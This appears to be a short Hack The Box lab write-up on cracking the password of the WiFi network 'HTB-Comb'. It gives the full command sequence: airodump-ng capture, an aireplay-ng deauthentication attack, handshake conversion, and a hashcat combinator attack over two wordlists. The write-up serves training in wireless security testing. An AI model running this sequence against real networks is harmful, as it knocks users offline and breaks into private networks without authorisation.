# [Combinator Attacks](Combinator%20Attacks.md)
### Crack the password for the WiFi network named "HTB-Comb" by combining the wordlists /opt/wordlist.txt and /opt/rockyou.txt.

```sh
airodump-ng -c 1 -w WPA wlan0mon
```

![](Screenshot%202026-10-01%20at%2016.36.19.png)

```sh
aireplay-ng -0 5 -a 02:00:00:00:08:00 -c 02:00:00:00:09:00 wlan0mon
```

![](Screenshot%202026-10-01%20at%2016.38.27.png)

Convert

```sh
hcxpcapngtool -o Comb.hc22000 WPA-01.cap
```

```sh
hashcat -m 22000 -a 1 Comb.hc22000 /opt/wordlist.txt /opt/rockyou.txt
```

![](Screenshot%202026-10-01%20at%2016.49.43.png)